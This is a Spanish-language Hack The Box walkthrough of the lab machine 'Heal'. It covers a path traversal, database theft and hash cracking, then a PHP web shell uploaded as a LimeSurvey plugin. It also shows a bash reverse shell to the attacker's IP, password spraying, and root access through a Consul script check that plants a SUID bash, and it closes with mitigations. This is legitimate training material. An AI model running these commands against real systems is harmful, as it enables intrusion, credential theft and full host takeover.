---
layout: single
title: Máquina Heal - Hack The Box
excerpt: Máquina linux sencilla, en la que logramos escalar privilegios debido a una mala configuración en un servicio para mantener contenedores/microservicios. 
classes: wide
header:
   teaser: ../assets/images/m
   teaser_home_page: true
   icon: ../assets/images/hackthebox.webp
categories:
   - hack the box
   - linux
tags:
   - ctf
   - consul
---

Empezamos con el escaneo: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ ping -c 1 10.10.11.46
PING 10.10.11.46 (10.10.11.46) 56(84) bytes of data.
64 bytes from 10.10.11.46: icmp_seq=1 ttl=63 time=104 ms

--- 10.10.11.46 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 103.641/103.641/103.641/0.000 ms
```

```bash
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ ports=$(nmap -p- --open -sS -T5 -n -Pn 10.10.11.46 | awk '/^[0-9]+\/tcp/ {split($1,a,"/"); print a[1]}' | paste -sd,)
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ echo $ports
22,80
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ nmap -p$ports 10.10.11.46 -sCV -oN heal_scan                                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-18 06:26 EDT
Nmap scan report for 10.10.11.46
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 68:af:80:86:6e:61:7e:bf:0b:ea:10:52:d7:7a:94:3d (ECDSA)
|_  256 52:f4:8d:f1:c7:85:b6:6f:c6:5f:b2:db:a6:17:68:ae (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://heal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.59 seconds
```

Realizamos fuzzing al sitio web: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ wfuzz -u http://10.10.11.46 -H "Host: FUZZ.heal.htb" --hc=301 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.46/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                    
=====================================================================

000000051:   200        90 L     186 W      12515 Ch    "api"
```

Y la agregamos al `/etc/hosts`. 

Podemos reaplicar un nmap a cada dominio en el puerto 80. 

Entramos al sitio, nos creamosuna cuenta y es una página para crear CV's: 

EL botón de `survey` nos lleva a `take-survey.heal.htb`, que agregamos al /etc/hosts.

El sitio nos permite guardar nuestro CV en formato pdf. 

Viendo los metadatos: 

```bash
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ exiftool 662721f1da35167ca282.pdf                   
ExifTool Version Number         : 13.25
File Name                       : 662721f1da35167ca282.pdf
Directory                       : .
File Size                       : 30 kB
File Modification Date/Time     : 2025:05:18 06:50:23-04:00
File Access Date/Time           : 2025:05:18 06:50:26-04:00
File Inode Change Date/Time     : 2025:05:18 07:01:56-04:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Title                           : 
Creator                         : wkhtmltopdf 0.12.6
Producer                        : Qt 5.15.3
Create Date                     : 2025:05:18 10:50:24Z
Page Count                      : 1
```

Podemos intentar aplicar fuzzing a directorios, pero no se encuentra nada:
```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ feroxbuster -u http://heal.htb -t 20 -n
```

**Analizando los endpoints**

Para `heal.htb` tenemos el siguiente botòn para exportar nuestro CV a pdf: 

![](../assets/images/machine-heal/1.png)

En burpsuite vemos que si le damos al botón de `Export As PDF` hay una peticiòn POST a `/exports`, si le damos a `Forward` hace una petición a `/downloads?filename=<filename>` que es el que nos devuelve el pdf. 


`En API Heal` vemos lo siguiente: 

![](../assets/images/machine-heal/2.png)


Y en `take-survey.heal.htb`: 

![](../assets/images/machine-heal/3.png)

Bien, tenemos las tecnologìas identificadas, ahora probramos cositas desde burpsuite y encontramos un `Path Traversal` en el endpoint de downloads, a continuacion vemos como logramos acceder al `/etc/hosts`

![](../assets/images/machine-heal/4.png)

Podemos guardarnos los usuarios:

```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ grep "sh$" passwd | awk -F: '{print $1}' > users.txt
```

<h3 style=""> Acceso inicial.</h3>

Usando la siguiente [guia](https://guides.rubyonrails.org/configuring.html) donde se proporciona info sobre como configurar una aplicaciòn con Rail, podemos tener una idea de donde encontrar ficheros importantes.
Vamos al `/config/database.yml` para encontrar las bases de datos

![](../assets/images/machine-heal/5.png)

Nos las descargamos: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ curl --path-as-is -s -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=../../storage/development.sqlite3' --output development.sqlite3

┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ file development.sqlite3 
development.sqlite3: SQLite 3.x database, last written using SQLite version 3045002, writer version 2, read version 2, file counter 2, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 2
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ curl --path-as-is -s -H $'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoyfQ.73dLFyR_K1A7yY9uDP6xu7H1p_c7DlFQEoN1g-LFFMQ' 'http://api.heal.htb/download?filename=../../storage/test.sqlite3' --output test.sqlite3
```


En `test.sqlite3` no encontramos nada interesante, en la otra BD sí: 
```bash
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ sqlite3 development.sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
ar_internal_metadata  token_blacklists
schema_migrations     users
sqlite> select * from users;
1|ralph@heal.htb|$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG|2024-09-27 07:49:31.614858|2024-09-27 07:49:31.614858|Administrator|ralph|1
2|dano@test.com|$2a$12$cGr/Tc163IT2oyEnDUq6zeDXfbuM66NffU5Gt42G2DyEJwykoNXyy|2025-05-18 18:13:12.837941|2025-05-18 18:13:12.837941|dano|dano|0
sqlite>
```

Tenemos un hash, podemos descubrir de qué tipo de hash se trata, primero en modo autodetección:

```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ hashcat hash.ralph /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-haswell-AMD A9-9420 RADEON R5, 5 COMPUTE CORES 2C+3G, 873/1811 MB (256 MB allocatable), 2MCU

The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].

Started: Sun May 18 22:39:53 2025
Stopped: Sun May 18 22:40:12 2025
```

Usamos bcrypt: 

```bash 
$ hashcat ralph.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt -m 3200
```

> Con una pc con suficientes recursos encontramos que la contraseña es: 147258369

La contraseña no nos sirve para autenticarnos en ssh. 

Un `heal.htb` nos sirve para autenticarnos, 

En `take-survey.heal.htb` aplicamos fuzzing para ver si encontramos una ruta para autenticarse:

```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ feroxbuster -u http://take-survey.heal.htb -t 10 -n --dont-extract-links
                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://take-survey.heal.htb
 🚀  Threads               │ 10
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      101l      306w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        7l       10w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://take-survey.heal.htb/modules => http://take-survey.heal.htb/modules/
200      GET     1085l     4127w    75816c http://take-survey.heal.htb/
301      GET        7l       12w      178c http://take-survey.heal.htb/admin => http://take-survey.heal.htb/admin/
301      GET        7l       12w      178c http://take-survey.heal.htb/tmp => http://take-survey.heal.htb/tmp/
301      GET        7l       12w      178c http://take-survey.heal.htb/plugins => http://take-survey.heal.htb/plugins/
301      GET        7l       12w      178c http://take-survey.heal.htb/themes => http://take-survey.heal.htb/themes/
301      GET        7l       12w      178c http://take-survey.heal.htb/editor => http://take-survey.heal.htb/editor/
301      GET        7l       12w      178c http://take-survey.heal.htb/docs => http://take-survey.heal.htb/docs/
301      GET        7l       12w      178c http://take-survey.heal.htb/assets => http://take-survey.heal.htb/assets/
301      GET        7l       12w      178c http://take-survey.heal.htb/upload => http://take-survey.heal.htb/upload/
302      GET        0l        0w        0c http://take-survey.heal.htb/Admin => http://take-survey.heal.htb/index.php/admin/authentication/sa/login
301      GET        7l       12w      178c http://take-survey.heal.htb/application => http://take-survey.heal.htb/application/
200      GET     1085l     4127w    75816c http://take-survey.heal.htb/surveys
301      GET        7l       12w      178c http://take-survey.heal.htb/installer => http://take-survey.heal.htb/installer/
301      GET        7l       12w      178c http://take-survey.heal.htb/locale => http://take-survey.heal.htb/locale/
``` 

Parece que podemo ir a `/admin`, las credenciales nos sirven, en el sitio parece no haber CVE's que funcionen en esta versiòn. 
Vemos que tenemos la opciòn de subir plugins, asì que subimos un código en php

```php 
<?php system($_REQUEST['cmd']); ?>
```

Si lo intentamos subir nos da un error, nos pide un fichero `config.xml`, [aqui](https://gitlab.com/SondagesPro/SampleAndDemo/ExampleSettings/-/blob/master/config.xml?ref_type=heads) se encuentra un ejemplo. 

Añadimos ambos a un zip y lo subimos. 

```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ zip uwu.zip owo.php 
  adding: owo.php (stored 0%)

┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ zip uwu.zip config.xml 
  adding: config.xml (deflated 53%)
```

Navegamos hasta el nombre que se le dió a nuestro pluggin: `/upload/plugins/ExampleSettings/`, sabemos que es esta ruta porque es dode se guardan según la [documentación](https://github.com/LimeSurvey/LimeSurvey) de Limesurvey en GitHub. 

Confirmamos la RCE: 

![](../assets/images/machine-heal/7.png)

Nos lanzamos una shell a nuestra máquina de atacante con `owo.php?cmd=bash -i 'bash -i >%26 /dev/tcp/10.10.14.76/4443 0>%261'` : 

```bash
┌──(kali㉿kali)-[~/labs-hack]
└─$ rlwrap nc -lvnp 4443
listening on [any] 4443 ...
connect to [10.10.14.76] from (UNKNOWN) [10.10.11.46] 34824
bash: cannot set terminal process group (1113): Inappropriate ioctl for device
bash: no job control in this shell
www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$ script /dev/null -c bash 
</plugins/ExampleSettings$ script /dev/null -c bash        
Script started, output log file is '/dev/null'.
www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$ 
zsh: suspended  rlwrap nc -lvnp 4443
                                                                                                                                                                                            
┌──(kali㉿kali)-[~/labs-hack]
└─$ stty raw -echo ; fg
[1]  + continued  rlwrap nc -lvnp 4443
www-data@heal:~/limesurvey/upload/plugins/ExampleSettings$ ls /home
ls /home
ralph  ron
```

Podemos ver lo sitios configurados en nginx: 
```bash 
www-data@heal:/etc/nginx/sites-enabled$ ls
ls
api.heal.htb  heal.htb  lime-survey.htb
```
Que ya habìamos agregado a nuestro /etc/hosts.

Mirando los procesos: 
```bash 
www-data@heal:/etc/nginx/sites-enabled$ ps auxww | grep -e 'node ' -e puma
ps auxww | grep -e 'node ' -e puma
ralph       1305  0.0  2.6 700048 103276 ?       Sl   May18   0:13 puma 6.4.3 (tcp://127.0.0.1:3001) [resume_api]
ralph       1473  0.0  1.1 791276 44272 ?        Sl   May18   0:00 node /home/ralph/resume-builder/node_modules/.bin/react-scripts start
ralph       1480  0.3  4.7 1401080 188632 ?      Sl   May18   2:51 node /home/ralph/resume-builder/node_modules/react-scripts/scripts/start.js
ralph       1490  0.0  2.7 1443316 109804 ?      Sl   May18   0:21 puma: cluster worker 0: 1305 [resume_api]
ralph       1494  0.0  2.7 1451388 108728 ?      Sl   May18   0:22 puma: cluster worker 1: 1305 [resume_api]
www-data   40322  0.0  0.0   3472  1672 pts/0    S+   06:54   0:00 grep -e node  -e puma
```

Hay un servidor web con [Puma](https://puma.io/)

Para `limesurvey` tenemos la configuración en `/var/www/limesurvey`, en `application/config` y en `config.php` podemos ver informacion interesante: 

```bash 
return array(                                                                                                                                                                               
        'components' => array(                                                                                                                                                              
                'db' => array(                                                                                                                                                              
                        'connectionString' => 'pgsql:host=localhost;port=5432;user=db_user;password=AdmiDi0_pA$$w0rd;dbname=survey;',                                                       
                        'emulatePrepare' => true,                                                                                                                                           
                        'username' => 'db_user',                                                                                                                                            
                        'password' => 'AdmiDi0_pA$$w0rd',                                                                                                                                   
                        'charset' => 'utf8',                                                                                                                                                
                        'tablePrefix' => 'lime_',                                                                                                                                      
```

Realizamos passwor sprying para ver si nos funciona: 

```bash 
┌──(kali㉿kali)-[~/labs-hack/heal]
└─$ netexec ssh heal.htb -u users.txt -p 'AdmiDi0_pA$$w0rd' --continue-on-succes
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
SSH         10.10.11.46     22     heal.htb         [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.10
SSH         10.10.11.46     22     heal.htb         [-] root:AdmiDi0_pA$$w0rd
SSH         10.10.11.46     22     heal.htb         [-] ralph:AdmiDi0_pA$$w0rd
SSH         10.10.11.46     22     heal.htb         [-] postgres:AdmiDi0_pA$$w0rd
SSH         10.10.11.46     22     heal.htb         [+] ron:AdmiDi0_pA$$w0rd  Linux - Shell access!
```

Y obtenemos la primera flag de usuario: 
```bash 
ron@heal:~$ whoami
ron
ron@heal:~$ ls
user.txt
ron@heal:~$ 
```

<h3 style=""> Escalada de privilegios.</h3>

Ahora, listando los procesos podemos ver lo siguiente: 
```bash 
ron@heal:~$ ps auxww
<SNIP>
root        1849  0.7  2.6 1359780 106524 ?      Ssl  May13   9:08 /usr/local/bin/consul agent -server -ui -advertise=127.0.0.1 -bind=127.0.0.1 -data-dir=/var/lib/consul -node=consul-01 -config-dir=/etc/consul.d
<SNIP>
```

Consul es una herramienta de HashiCorp diseñada principalmente para sistemas distribuidos. Su función principal es facilitar la descubrimiento de servicios, configuración centralizada y monitoreo de salud (health checks) entre múltiples servicios y nodos en una red.

- Permite que los servicios (por ejemplo, una API, una base de datos, una app) se registren automáticamente y se anuncien a otros servicios. En lugar de codificar una IP o hostname, puedes preguntar a Consul:
- Consul puede ejecutar comandos, scripts o peticiones HTTP periódicamente para saber si un servicio está funcionando correctamente. Si el check falla, Consul lo desregistra y otros servicios lo dejan de usar. Esto evita balancear tráfico a servicios caídos.
- Puedes hacer peticiones DNS o HTTP para consultar servicios registrados.
- Incluye un sistema de autenticación y autorización con tokens que permiten controlar quién puede consultar o modificar qué cosas dentro del cluster.

**¿En qué contextos se usa?** 
- Microservicios: donde hay muchos servicios que deben encontrarse dinámicamente.
- Infraestructura moderna (Kubernetes, Nomad, Docker): para coordinación y visibilidad.
- Automatización DevOps: usando Consul junto con Terraform, Vault y otros productos de HashiCorp.

Tenemos el binario: 

```bash 
ron@heal:~$ consul 
Usage: consul [--version] [--help] <command> [<args>]

Available commands are:
    acl             Interact with Consul's ACLs
    agent           Runs a Consul agent
    catalog         Interact with the catalog
    config          Interact with Consul's Centralized Configurations
    connect         Interact with Consul Connect
    debug           Records a debugging archive for operators
    event           Fire a new event
    exec            Executes a command on Consul nodes
    force-leave     Forces a member of the cluster to enter the "left" state
    info            Provides debugging information for operators.
    intention       Interact with Connect service intentions
    join            Tell Consul agent to join cluster
    keygen          Generates a new encryption key
    keyring         Manages gossip layer encryption keys
    kv              Interact with the key-value store
    leave           Gracefully leaves the Consul cluster and shuts down
    lock            Execute a command holding a lock
    login           Login to Consul using an auth method
    logout          Destroy a Consul token created with login
    maint           Controls node or service maintenance mode
    members         Lists the members of a Consul cluster
```

Y podemos ver la configuración en `/etc/consud.d/config.json`

```bash 
ron@heal:~$ cat /etc/consul.d/config.json
{
"bootstrap":true,
"server": true,
"log_level": "DEBUG",
"enable_syslog": true,
"enable_script_checks": true,
"datacenter":"server1",
"addresses": {
        "http":"127.0.0.1"
},
"bind_addr": "127.0.0.1",
"node_name":"heal-internal",
"data_dir":"/var/lib/consul",
"acl_datacenter":"heal-server",
"acl_default_policy":"allow",
"encrypt":"l5/ztsxHF+OWZmTkjlLo92IrBBCRTTNDpdUpg2mJnmQ="
```

ACL predeterminada “allow”
```bash
"acl_default_policy": "allow"
```

Esto significa que no se requiere autenticación ni tokens ACL para llamar a la API de agente y registrar servicios o checks.

Entonces podemos crear un json definiendo un bloque `check` con lo siguiente: 
```json
{
  "Name": "owo service",
  "ID": "rev-shell",
  "Port": 0,
  "Check": {
      "args": ["bash", "-c", "cp /bin/bash /tmp/uwu && chmod 6777 /tmp/uwu"],
      "interval": "30s",
      "timeout": "5s"
  }
}
```
- cp /bin/bash /tmp/0xdf copia el intérprete de Bash.
- chmod 6777 /tmp/0xdf pone el bit SUID y SGID (6 → owner+group sticky), de modo que quien ejecute /tmp/0xdf obtenga los privilegios del propietario (root).

Lo mandamos a la API: 

```bash 
ron@heal:/dev/shm$ vim uwu.json
ron@heal:/dev/shm$ curl -X PUT http://127.0.0.1:8500/v1/agent/service/register -H "Content-Type: application/json" -d @uwu.json 
ron@heal:/dev/shm$ ls /tmp
runtime-ralph                                                                     systemd-private-dd0c1005821a469787526d38455a3de0-systemd-timesyncd.service-RIgRbX
systemd-private-dd0c1005821a469787526d38455a3de0-ModemManager.service-y3REGC      systemd-private-dd0c1005821a469787526d38455a3de0-upower.service-7HSF4k
systemd-private-dd0c1005821a469787526d38455a3de0-systemd-logind.service-Po8QaV    uwu
systemd-private-dd0c1005821a469787526d38455a3de0-systemd-resolved.service-iROuz3  vmware-root_782-2965579254
ron@heal:/dev/shm$ /tmp/uwu -p 
uwu-5.1# whoami
root
uwu-5.1# ls /root
cleanup-consul.sh  consul-up.sh  plugin_cleanup.sh  root.txt
uwu-5.1# 
```

## Mitigaciones

1. **Activar ACLs y políticas estrictas**

   * Poner `acl_default_policy: deny` y requerir tokens ACL con permisos muy limitados para usuarios/servicios.

2. **Deshabilitar script checks**

   * En el config:

     ```json
     "enable_script_checks": false
     ```

     Así no podrás ejecutar comandos arbitrarios desde la API.

3. **Ejecutar el agente con un usuario sin privilegios**

   * Crear un usuario `consul` sin acceso a `/bin` y servir sólo desde un directorio aislado.

4. **Revisar y monitorear registros de la API**

   * Auditoría de llamadas a `/v1/agent/service/register` para detectar intentos de registrar servicios maliciosos.

5. **Segregar la interfaz de administración**

   * Si solo la UI o ciertos nodos necesitan exponer la API HTTP, ponerla detrás de un firewall o interfaz de loopback inaccesible.

Con estas defensas evitarás que un atacante sin privilegios aproveche la capacidad de Consul para lanzar comandos y te proteges contra esta forma de RCE y escalada de privilegios.

